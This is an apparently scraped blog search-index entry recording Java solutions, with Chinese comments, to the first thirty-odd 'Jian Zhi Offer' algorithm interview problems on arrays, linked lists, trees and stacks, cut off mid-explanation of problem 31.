<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[《剑指offer》刷题记录]]></title>
    <url>%2F2020%2F08%2F%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[《剑指offer》刷题记录1.二维数组的查找标签：【数组】【查找】题目描述 在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 代码12345678910111213141516171819202122232425public class Solution &#123; public boolean Find(int target, int [][] array) &#123; if(array==null || array.length==0)&#123; return false; &#125; //二分查找 for(int i=0;i&lt;array.length;i++)&#123; int low=0; int high=array[i].length-1; while(low&lt;=high)&#123; int mid=(low+high)/2; if(array[i][mid]&lt;target)&#123; low=mid+1; &#125; else if(array[i][mid]&gt;target)&#123; high=mid-1; &#125; else&#123; return true; &#125; &#125; &#125; return false; &#125;&#125; 2.替换空格标签：【字符串】题目描述 请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。 代码123456789101112131415161718public class Solution &#123; public String replaceSpace(StringBuffer str) &#123; if(str==null) return ""; else &#123; String result=""; //注意split方法，传入"\\s"转义字符表示空格，-1为limit表示返回结果长度不做限制，否则不能返 //回分隔符是最后一个字符这种情况下分隔符后的""字符 String[] res=str.toString().split("\\s",-1); for(String s :res) &#123; result=result+s+"%20"; &#125; //substring方法左闭右开 return result.substring(0,result.length()-3); &#125; &#125;&#125; 3.从尾到头打印链表标签：【链表】题目描述 输入一个链表，按链表从尾到头的顺序返回一个ArrayList。 代码12345678910111213141516171819202122232425262728/*** public class ListNode &#123;* int val;* ListNode next = null;** ListNode(int val) &#123;* this.val = val;* &#125;* &#125;**/import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; res=new ArrayList&lt;&gt;(); if(listNode==null)&#123; return res; &#125; ListNode temp=listNode; //由题意，先进后出，即栈，利用ArrayList的add(position,value)方法，每次在0位置插入新值，然后 //从头输出即复合题意了 while(temp!=null)&#123; res.add(0,temp.val); temp=temp.next; &#125; return res; &#125;&#125; 4.重建二叉树标签：【树】题目描述 输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。 代码123456789101112131415161718192021222324252627282930313233/** * Definition for binary tree * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */import java.util.*;public class Solution &#123; public TreeNode reConstructBinaryTree(int[] pre, int[] in) &#123; //安全带：递归退出条件 if (pre == null || in == null || pre.length == 0 || in.length == 0) &#123; return null; &#125; //必要的一些处理 TreeNode root = new TreeNode(pre[0]); int index = 0; for (int i = 0; i &lt; in.length; i++) &#123; if (in[i] == pre[0]) &#123; index = i; break; &#125; &#125; //开始递归 root.left = reConstructBinaryTree(Arrays.copyOfRange(pre, 1, index + 1), Arrays.copyOfRange(in, 0, index)); root.right = reConstructBinaryTree(Arrays.copyOfRange(pre, index + 1, pre.length), Arrays.copyOfRange(in, index + 1, in.length)); return root; &#125;&#125; 5.用两个栈实现队列标签：【队列】【栈】题目描述 用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。 代码12345678910111213141516171819import java.util.Stack;public class Solution &#123; Stack&lt;Integer&gt; stack1 = new Stack&lt;Integer&gt;(); Stack&lt;Integer&gt; stack2 = new Stack&lt;Integer&gt;(); public void push(int node) &#123; stack1.push(node); &#125; public int pop() &#123; if (stack2.size() == 0) &#123; while (stack1.size() != 0) &#123; stack2.push(stack1.pop()); &#125; &#125; return stack2.pop(); &#125;&#125; 6.旋转数组的最小数字标签：【查找】题目描述 把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。 代码12345678910111213141516171819202122232425262728293031323334353637import java.util.ArrayList;public class Solution &#123; public int minNumberInRotateArray(int[] array) &#123; if (array == null || array.length == 0) &#123; return 0; &#125; //二分查找 int low = 0; int high = array.length - 1; while (low &lt; high) &#123; //非递减的数组提前返回 if (array[low] &lt; array[high]) &#123; return array[low]; &#125; int mid = (low + high) / 2; //情况1，arr[mid] &gt; target：4 5 6 1 2 3 //arr[mid] 为 6， target为右端点 3， arr[mid] &gt; target, 说明[first ... mid] 都是 //&gt;= target 的，因为原始数组是非递减，所以可以确定答案为 [mid+1...last]区间,所以 first //= mid + 1 if (array[mid] &gt; array[high]) &#123; low = mid + 1; &#125; //情况2，arr[mid] &lt; target:5 6 1 2 3 4 //arr[mid] 为 1， target为右端点 4， arr[mid] &lt; target, 说明答案肯定不在 //[mid+1...last]，但是arr[mid] 有可能是答案,所以答案在[first, mid]区间，所以last = //mid; else if (array[mid] &lt; array[high]) &#123; high = mid; &#125; //情况3，arr[mid] == target: //如果是 1 0 1 1 1， arr[mid] = target = 1, 显然答案在左边 //如果是 1 1 1 0 1, arr[mid] = target = 1, 显然答案在右边 //所以这种情况，不能确定答案在左边还是右边，那么就让last = last - 1;慢慢缩少区间，同时也 //不会错过答案。 else &#123; high--; &#125; &#125; return array[low]; &#125;&#125; 7.斐波那契数列标签：【递归】【动态规划】题目描述 大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0，第1项是1）。 n&lt;=39 代码1234567891011121314151617181920public class Solution &#123; public int Fibonacci(int n) &#123; if (n == 0) &#123; return 0; &#125; else if (n == 1) &#123; return 1; &#125; else &#123; //直接使用递归复杂度超高，采用记表法记录最近两位的值 int sum = 1; int one = 0; while (n &gt; 1) &#123; sum = sum + one; one = sum - one; n--; &#125; return sum; &#125; &#125;&#125; 8.跳台阶标签：【递归】【动态规划】题目描述 一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。 代码1234567891011121314151617public class Solution &#123; public int JumpFloor(int target) &#123; if (target == 0 || target == 1) &#123; return target; &#125; //动态规划，优化掉递归栈空间。常规方法是从上往下递归然后再从下往上回溯的，最后回溯的时候来合并子树 //从而求得答案。那么动态规划不同的是，不用递归的过程，直接从子树求得答案。过程是从下往上。并且对空 //间复杂度也做了优化 int a = 1; int b = 1; int c = 0; for (int i = 2; i &lt;= target; i++) &#123; c = a + b; a = b; b = c; &#125; return c; &#125;&#125; 9.变态跳台阶标签：【动态规划】题目描述 一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 代码123456789101112131415public class Solution &#123; public int JumpFloorII(int target) &#123; if (target == 0 || target == 1) &#123; return target; &#125; //可以采用递归，记忆化递归，动态规划，递推。这里采用递推的方式。 int a = 1; int b = 0; for (int i = 2; i &lt;= target; i++) &#123; b = a &lt;&lt; 1; a = b; &#125; return b; &#125;&#125; 10.矩形覆盖标签：【递归】题目描述 我们可以用21的小矩形横着或者竖着去覆盖更大的矩形。请问用n个21的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？ 比如n=3时，2*3的矩形块有3种覆盖方法： 代码1234567891011121314151617public class Solution &#123; public int RectCover(int target) &#123; if (target == 0 || target == 1 || target == 2) &#123; return target; &#125; //动态规划 int a = 1; int b = 2; int c = 0; for (int i = 3; i &lt;= target; i++) &#123; c = a + b; a = b; b = c; &#125; return c; &#125;&#125; 11.二进制中1的个数标签：【数学】题目描述 输入一个整数，输出该数32位二进制表示中1的个数。其中负数用补码表示。 代码1234567891011121314public class Solution &#123; public int NumberOf1(int n) &#123; if (n == 0) &#123; return 0; &#125; //如果一个整数不为0，那么这个整数至少有一位是1。如果我们把这个整数减1，那么原来处在整数最右边的1 //就会变为0，原来在1后面的所有的0都会变成1(如果最右边的1后面还有0的话)。其余所有位将不会受到影 //响。也就是说，把一个整数减去1，再和原整数做与运算，会把该整数最右边一个1变成0.那么一个整数的二 //进制有多少个1，就可以进行多少次这样的操作。(很像CSAPP里的各种技巧啊) int count = 0; while (n != 0) &#123; count++; n = n &amp; (n - 1); &#125; return count; &#125;&#125; 12.数值的整数次方标签：【数学】题目描述 给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。 保证base和exponent不同时为0 代码1234567891011121314public class Solution &#123; public double Power(double base, int exponent) &#123; if (base == 0.0) &#123; return base; &#125; //不直接用JDK自带的函数了 double res = 1.0; int e = exponent &gt; 0 ? exponent : -exponent; for (int i = 0; i &lt; e; i++) &#123; res = res * base; &#125; return exponent &gt; 0 ? res : 1 / res; &#125;&#125; 13.调整数组顺序使奇数位于偶数前面标签：【数组】题目描述 输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。 代码123456789101112131415161718192021222324252627import java.util.*;public class Solution &#123; public void reOrderArray(int[] array) &#123; if (array == null || array.length == 0) &#123; return; &#125; //存放奇数的队列 Queue&lt;Integer&gt; queue1 = new LinkedList&lt;Integer&gt;(); //存放偶数的队列 Queue&lt;Integer&gt; queue2 = new LinkedList&lt;Integer&gt;(); for (int i = 0; i &lt; array.length; i++) &#123; if (array[i] % 2 == 1) &#123; queue1.add(array[i]); &#125; else &#123; queue2.add(array[i]); &#125; &#125; int j = 0; while (queue1.size() != 0) &#123; array[j++] = queue1.remove(); &#125; while (queue2.size() != 0) &#123; array[j++] = queue2.remove(); &#125; &#125;&#125; 14.链表中倒数第k个结点标签：【链表】题目描述 输入一个链表，输出该链表中倒数第k个结点。 代码1234567891011121314151617181920212223242526272829303132333435/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/import java.util.*;public class Solution &#123; public ListNode FindKthToTail(ListNode head, int k) &#123; if (head == null || k &lt;= 0) &#123; return null; &#125; //常规做法是使用快慢指针，这里用优先级队列来实现复习一下（性能比快慢指针差些） Queue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;(Collections.reverseOrder()); Map&lt;Integer, ListNode&gt; temp = new HashMap&lt;&gt;(); int i = 1; ListNode curr = head; while (curr != null) &#123; temp.put(i, curr); queue.add(i); curr = curr.next; i++; &#125; for (int j = 0; j &lt; k - 1; j++) &#123; queue.remove(); &#125; return temp.get(queue.peek()); &#125;&#125; 15.反转链表标签：【链表】题目描述 输入一个链表，反转链表后，输出新链表的表头。 代码123456789101112131415161718192021222324252627/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ListNode ReverseList(ListNode head) &#123; //3个指针:1）pre指针指向已经反转好的链表的最后一个结点，最开始没有反转，所以指向null; 2）cur //指针指向待反转链表的第一个结点，最开始第一个结点待反转，所以指向head;3）nex指针指向待反转链表 //的第二个结点，目的是保存链表，因为cur改变指向后，后面的链表则失效了，所以需要保存。然后调整各结 //点的next指向就可以了。 ListNode pre; ListNode cur; ListNode next; pre = null; cur = head; next = head; while (cur != null) &#123; next = cur.next; cur.next = pre; pre = cur; cur = next; &#125; return pre; &#125;&#125; 16.合并两个排序的链表标签：【链表】题目描述 输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。 代码123456789101112131415161718192021222324252627282930313233/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ListNode Merge(ListNode list1, ListNode list2) &#123; //哨兵结点，保证每个结点都有前驱结点 ListNode head = new ListNode(-1); ListNode curr = head; while (list1 != null &amp;&amp; list2 != null) &#123; if (list1.val &lt; list2.val) &#123; curr.next = list1; list1 = list1.next; curr = curr.next; &#125; else &#123; curr.next = list2; list2 = list2.next; curr = curr.next; &#125; &#125; if (list1 == null) &#123; curr.next = list2; &#125; else if (list2 == null) &#123; curr.next = list1; &#125; return head.next; &#125;&#125; 17.树的子结构标签：【二叉树】【树】题目描述 输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构） 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * public TreeNode(int val) &#123; * this.val = val; * &#125; * &#125; */public class Solution &#123; public boolean HasSubtree(TreeNode root1, TreeNode root2) &#123; if (root1 == null || root2 == null) &#123; return false; &#125; //两棵树根结点相等则判断是否B是A的子结构 if (root1.val == root2.val) &#123; if (judge(root1, root2)) &#123; return true; &#125; &#125; //否则判断B是否是A的左子树的子结构或者右子树的子结构 return HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2); &#125; private boolean judge(TreeNode root1, TreeNode root2) &#123; //B树遍历完了，则说明B是A的子结构 if (root2 == null) &#123; return true; &#125; //B树还没有遍历完，A树就遍历完了，则B树肯定不是A树的子结构 if (root1 == null) &#123; return false; &#125; //当两树根结点相等时，继续递归判断A的左子树跟B的左子树，A的右子树跟B的右子树是否也满足这种子结构 //关系 if (root1.val == root2.val) &#123; return judge(root1.left, root2.left) &amp;&amp; judge(root1.right, root2.right); &#125; //只要当前树的根结点不相等，就说明在当前跟结点下B不是A的子结构了 return false; &#125;&#125; 18.二叉树的镜像标签：【树】题目描述 操作给定的二叉树，将其变换为源二叉树的镜像。 1234567891011121314&gt; 输入描述:&gt; 二叉树的镜像定义：源二叉树 &gt; 8&gt; / \&gt; 6 10&gt; / \ / \&gt; 5 7 9 11&gt; 镜像二叉树&gt; 8&gt; / \&gt; 10 6&gt; / \ / \&gt; 11 9 7 5&gt; 代码1234567891011121314151617181920212223242526/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * &lt;p&gt; * public TreeNode(int val) &#123; * this.val = val; * &lt;p&gt; * &#125; * &lt;p&gt; * &#125; */public class Solution &#123; public void Mirror(TreeNode root) &#123; if (root == null) &#123; return; &#125; //左右子树依次从上到下调整 TreeNode temp = root.left; root.left = root.right; root.right = temp; Mirror(root.left); Mirror(root.right); &#125;&#125; 19.顺时针打印矩阵标签：【数组】题目描述 输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10. 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import java.util.ArrayList;/*** 没啥技巧，考虑周全即可**/public class Solution &#123; public ArrayList&lt;Integer&gt; printMatrix(int[][] matrix) &#123; if (matrix == null) &#123; return null; &#125; int totalrows = matrix.length; int totalcols = matrix[0].length; int count = 0; int startrow = 0; int startcol = 0; ArrayList&lt;Integer&gt; res = new ArrayList&lt;&gt;(); while (count &lt; matrix.length * matrix[0].length) &#123; count = count + (2 * totalcols + 2 * (totalrows - 2)); if (totalcols == 1) &#123; for (int i = 0; i &lt; totalrows; i++) &#123; res.add(matrix[startrow++][startcol]); &#125; &#125; else if (totalrows == 1) &#123; for (int i = 0; i &lt; totalcols; i++) &#123; res.add(matrix[startrow][startcol++]); &#125; &#125; else &#123; print(matrix, startrow++, startcol++, totalrows, totalcols, res); &#125; totalrows -= 2; totalcols -= 2; &#125; return res; &#125; private void print(int[][] matrix, int row, int col, int totalrows, int totalcols, ArrayList&lt;Integer&gt; res) &#123; //打印上面的行 for (int i = 0; i &lt; totalcols; i++) &#123; res.add(matrix[row][col++]); &#125; col--; //打印右边的列 for (int i = 0; i &lt; totalrows - 1; i++) &#123; res.add(matrix[++row][col]); &#125; //打印下面的行 for (int i = 0; i &lt; totalcols - 1; i++) &#123; res.add(matrix[row][--col]); &#125; //打印左边的列 for (int i = 0; i &lt; totalrows - 2; i++) &#123; res.add(matrix[--row][col]); &#125; &#125;&#125; 20.包含min函数的栈标签：【栈】题目描述 定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O（1））。 注意：保证测试中不会当栈为空的时候，对栈调用pop()或者min()或者top()方法。输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10. 代码123456789101112131415161718192021222324252627import java.util.PriorityQueue;import java.util.Stack;import java.util.Queue;public class Solution &#123; //PriorityQueue太实用了 Stack&lt;Integer&gt; stack = new Stack&lt;Integer&gt;(); Queue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;(); public void push(int node) &#123; stack.push(node); queue.add(node); &#125; public void pop() &#123; stack.pop(); queue.remove(); &#125; public int top() &#123; return stack.peek(); &#125; public int min() &#123; return queue.peek(); &#125;&#125; 21.栈的压入、弹出序列标签：【栈】题目描述 输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的） 代码1234567891011121314151617181920212223242526272829303132import java.util.Stack;public class Solution &#123; public boolean IsPopOrder(int[] pushA, int[] popA) &#123; if (pushA == null || popA == null || pushA.length != popA.length) &#123; return false; &#125; //辅助栈 Stack&lt;Integer&gt; stack = new Stack&lt;Integer&gt;(); int i = 0; int j = 0; while (j &lt; popA.length) &#123; //辅助栈包含要出栈的元素，比较实际出栈元素和期望出栈元素是否一致 if (stack.contains(popA[j])) &#123; if (stack.pop() != popA[j]) &#123; return false; &#125; j++; &#125; //辅助栈不包含则要入栈 else if (i &lt; pushA.length) &#123; stack.push(pushA[i]); i++; &#125; //所有元素都一如栈，期望元素不在辅助栈中，说明期望的是一个不存在的数，返回false else &#123; return false; &#125; &#125; return true; &#125;&#125; 22.从上往下打印二叉树标签：【队列】【树】题目描述 从上往下打印出二叉树的每个节点，同层节点从左至右打印。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.util.ArrayList;import java.util.LinkedList;/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * &lt;p&gt; * public TreeNode(int val) &#123; * this.val = val; * &lt;p&gt; * &#125; * &lt;p&gt; * &#125; */public class Solution &#123; public ArrayList&lt;Integer&gt; PrintFromTopToBottom(TreeNode root) &#123; ArrayList&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); if (root == null) &#123; return res; &#125; res.add(root.val); //用一个队列保存结点信息 LinkedList&lt;TreeNode&gt; queue = new LinkedList&lt;TreeNode&gt;(); queue.add(root); print(res, queue); return res; &#125; private void print(ArrayList&lt;Integer&gt; res, LinkedList&lt;TreeNode&gt; queue) &#123; while (queue.size() != 0) &#123; TreeNode root = queue.remove(); if (root.left != null) &#123; queue.add(root.left); res.add(root.left.val); &#125; if (root.right != null) &#123; queue.add(root.right); res.add(root.right.val); &#125; &#125; &#125;&#125; 23.二叉搜索树的后序遍历序列标签：【栈】【树】题目描述 输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes,否则输出No。假设输入的数组的任意两个数字都互不相同。 代码1234567891011121314151617181920212223242526272829public class Solution &#123; public boolean VerifySquenceOfBST(int[] sequence) &#123; if (sequence == null || sequence.length == 0) &#123; return false; &#125; return verify(sequence, 0, sequence.length - 1); &#125; //一棵 BST ：左孩子 &lt; 根结点 &lt; 右孩子;一棵 BST 的左子树或者右子树都是 BST;左子树区间的所有结点值 //&lt; 根结点值 &lt; 右子树区间所有结点值. private boolean verify(int[] sequence, int start, int end) &#123; if (start &gt;= end) &#123; return true; &#125; //寻找右子树的开始结点 int index = start; for (int i = index; i &lt; end &amp;&amp; sequence[i] &lt; sequence[end]; i++) &#123; index++; &#125; //右子树进行判断 for (int i = index; i &lt; end; i++) &#123; if (sequence[i] &lt;= sequence[end]) &#123; return false; &#125; &#125; //递归 return verify(sequence, start, index - 1) &amp;&amp; verify(sequence, index, end - 1); &#125;&#125; 24.二叉树中和为某一值的路径标签：【树】【回溯法】题目描述 输入一颗二叉树的根节点和一个整数，按字典序打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import java.util.ArrayList;import java.util.Stack;/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * &lt;p&gt; * public TreeNode(int val) &#123; * this.val = val; * &lt;p&gt; * &#125; * &lt;p&gt; * &#125; */public class Solution &#123; Stack&lt;Integer&gt; path = new Stack&lt;Integer&gt;(); ArrayList&lt;ArrayList&lt;Integer&gt;&gt; paths = new ArrayList&lt;&gt;(); public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root, int target) &#123; if (root == null) &#123; return paths; &#125; if (root != null &amp;&amp; root.val == target) &#123; path.push(root.val); //注意下ArrayList的这种构造方法 paths.add(new ArrayList&lt;Integer&gt;(path)); return paths; &#125; find(root, target); return paths; &#125; private void find(TreeNode root, int target) &#123; if (root == null) &#123; return; &#125; //回溯法 path.push(root.val); //叶子结点 if (root.val == target &amp;&amp; root.left == null &amp;&amp; root.right == null) &#123; paths.add(new ArrayList&lt;Integer&gt;(path)); //出栈 path.pop(); return; &#125; find(root.left, target - root.val); find(root.right, target - root.val); //回溯 path.pop(); &#125;&#125; 25.复杂链表的复制标签：【链表】题目描述 输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针random指向一个随机节点），请对此链表进行深拷贝，并返回拷贝后的头结点。（注意，输出结果中请不要返回参数中的节点引用，否则判题程序会直接返回空） 代码1234567891011121314151617181920212223242526272829303132333435363738/*public class RandomListNode &#123; int label; RandomListNode next = null; RandomListNode random = null; RandomListNode(int label) &#123; this.label = label; &#125;&#125;*/import java.util.HashMap;public class Solution &#123; public RandomListNode Clone(RandomListNode pHead) &#123; if (pHead == null) &#123; return null; &#125; //map保存新老结点之间的映射关系 HashMap&lt;RandomListNode, RandomListNode&gt; map = new HashMap&lt;RandomListNode, RandomListNode&gt;(); RandomListNode curr = pHead; RandomListNode after = pHead; while (curr != null) &#123; map.put(curr, new RandomListNode(curr.label)); curr = curr.next; &#125; while (after.next != null) &#123; map.get(after).next = map.get(after.next); map.get(after).random = map.get(after.random); after = after.next; &#125; map.get(after).next = null; map.get(after).random = null; return map.get(pHead); &#125;&#125; 26.二叉搜索树与双向链表标签：【链表】【二叉搜索树】题目描述 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。 代码1234567891011121314151617181920212223242526272829303132333435/** * public class TreeNode &#123; * int val = 0; * TreeNode left = null; * TreeNode right = null; * &lt;p&gt; * public TreeNode(int val) &#123; * this.val = val; * &lt;p&gt; * &#125; * &lt;p&gt; * &#125; */public class Solution &#123; //前驱结点 TreeNode pre = null; //链表头 TreeNode firstLeft = null; public TreeNode Convert(TreeNode pRootOfTree) &#123; if (pRootOfTree == null) &#123; return pRootOfTree; &#125; //中序遍历二叉搜索树即得到一个递增的序列 Convert(pRootOfTree.left); pRootOfTree.left = pre; firstLeft = firstLeft == null ? pRootOfTree : firstLeft; if (pre != null) &#123; pre.right = pRootOfTree; &#125; pre = pRootOfTree; Convert(pRootOfTree.right); return firstLeft; &#125;&#125; 27.字符串的排序标签：【字符串】【动态规划】【递归】题目描述 输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。 输入描述： 12&gt; 输入一个字符串,长度不超过9(可能有字符重复),字符只包括大小写字母。&gt; 代码1234567891011121314151617181920212223242526272829303132333435363738import java.util.ArrayList;import java.util.Scanner;import java.util.TreeSet;public class Solution &#123; public ArrayList&lt;String&gt; Permutation(String str) &#123; if (str == null || str.length() == 0) &#123; return new ArrayList&lt;String&gt;(); &#125; //保证字典序且去重 TreeSet&lt;String&gt; res = new TreeSet&lt;&gt;(); StringBuffer sb = new StringBuffer(); back(str, sb, res); ArrayList&lt;String&gt; result = new ArrayList&lt;&gt;(); for (String item : res) &#123; result.add(item); &#125; return result; &#125; public void back(String str, StringBuffer sb, TreeSet&lt;String&gt; res) &#123; if (str.length() == 1) &#123; sb.append(str); res.add(sb.toString()); sb.deleteCharAt(sb.length() - 1); return; &#125; for (int i = 0; i &lt; str.length(); i++) &#123; sb.append(str.charAt(i)); StringBuffer stringBuffer = new StringBuffer(str); //灵活使用StringBuffer的方法 back(stringBuffer.deleteCharAt(i).toString(), sb, res); //回溯 sb.deleteCharAt(sb.length()-1); &#125; &#125;&#125; 28.数组中出现次数超过一半的数字标签：【数组】题目描述 数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。 代码123456789101112131415161718192021222324252627282930313233343536373839public class Solution &#123; public int MoreThanHalfNum_Solution(int[] array) &#123; //候选法 int target = 0; int count = 0; if (array == null || array.length == 0) &#123; return target; &#125; for (int i = 0; i &lt; array.length; i++) &#123; //战场无人，我方+1 if (count == 0) &#123; target = array[i]; count++; &#125; else &#123; //战场有人且是敌方的人，我方-1 if (target != array[i]) &#123; count--; &#125; else &#123; //战场有人且是我方的人，我方+1 count++; &#125; &#125; &#125; count = 0; //清理战场，确认我方人数超过一半，防止有一个人猫着在最后等两败俱伤才出来 for (int i = 0; i &lt; array.length; i++) &#123; if (array[i] == target) &#123; count++; &#125; &#125; if (count &gt; array.length / 2) &#123; return target; &#125; else &#123; target = 0; &#125; return target; &#125;&#125; 29.最小的K个数标签：【数组】【高级算法】题目描述 输入n个整数，找出其中最小的K个数。例如输入4,5,1,6,2,7,3,8这8个数字，则最小的4个数字是1,2,3,4,。 代码123456789101112131415161718192021import java.util.PriorityQueue;import java.util.ArrayList;public class Solution &#123; public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] input, int k) &#123; ArrayList&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); if (input == null || input.length == 0 || k &gt; input.length) &#123; return res; &#125; //优先级队列的应用，底层默认使用的是小顶堆 PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;(); for (int i = 0; i &lt; input.length; i++) &#123; queue.add(input[i]); &#125; for (int i = 0; i &lt; k; i++) &#123; //小顶堆堆顶元素永远是最小的元素 res.add(queue.remove()); &#125; return res; &#125;&#125; 30.连续子数组的最大和标签：【数组】题目描述 HZ偶尔会拿些专业问题来忽悠那些非计算机专业的同学。今天测试组开完会后,他又发话了:在古老的一维模式识别中,常常需要计算连续子向量的最大和,当向量全为正数的时候,问题很好解决。但是,如果向量中包含负数,是否应该包含某个负数,并期望旁边的正数会弥补它呢？例如:{6,-3,-2,7,-15,1,2,2},连续子向量的最大和为8(从第0个开始,到第3个为止)。给一个数组，返回它的最大连续子序列的和，你会不会被他忽悠住？(子向量的长度至少是1) 代码12345678910111213141516171819202122232425262728293031323334/*** (类似股票买卖问题)* 对下标为i的元素array[i]，先试探的加上array[i], 如果和为负数，显然，以i结尾的元素对整个结果不作贡 * 献。* 具体过程：* 初始化：维护一个变量temp = 0* 如果temp+array[i] &lt; 0, 说明以i结尾的不作贡献，重新赋值temp = 0* 否则更新temp = temp + array[i]* 最后判断temp是否等于0， 如果等于0， 说明数组都是负数，选取一个最大值为答案。**/public class Solution &#123; public int FindGreatestSumOfSubArray(int[] array) &#123; int temp = 0; int res = 0; for (int i = 0; i &lt; array.length; i++) &#123; if (temp + array[i] &lt; 0) &#123; temp = 0; &#125; else &#123; temp = temp + array[i]; res = Math.max(res, temp); &#125; &#125; if (temp == 0) &#123; int max = array[0]; for (int i = 0; i &lt; array.length; i++) &#123; if (array[i] &gt; max) &#123; max = array[i]; &#125; &#125; res = max; &#125; return res; &#125;&#125; 31.整数中1出现的次数（从1到n整数中1出现的次数）标签：【查找】【数学】题目描述 求出1~13的整数中1出现的次数,并算出100~1300的整数中1出现的次数？为此他特别数了一下1~13中包含1的数字有1、10、11、12、13因此共出现6次,但是对于后面问题他就没辙了。ACMer希望你们帮帮他,并把问题更加普遍化,可以很快的求出任意非负整数区间中1出现的次数（从1 到 n 中1出现的次数）。 代码123456789101112131415161718192021222324252627282930313233343536373839/*设N = abcde ,其中abcde分别为十进制中各位上的数字。如果要计算百位上1出现的次数，它要受到3方面的影响：百位上的数字，百位以下（低位）的数字，百位以上（高位）的数字。① 如果百位上数字为0，百位上可能出现1的次数由更高位决定。比如：12013，则可以知道百位出现1的情况可能是：100~199，1100~1199,2100~2199，，...，11100~11199，一共1200个。可以看出是由更高位数字（12）决定，并且等于更高位数字（12）乘以 当前位数（100）。② 如果百位上数字为1，百位上可能出现1的次数不仅受更高位影响还受低位影响。比如：12113，则可以知道百位受高位影响出现的情况是：100~199，1100~1199,2100~2199，，....，11100~11199，一共1200个。和上面情况一样，并且等于更高位数字（12）乘以 当前位数（100）。但同时它还受低位影响，百位出现1的情况是：12100~12113,一共114个，等于低位数字（113）+1。③ 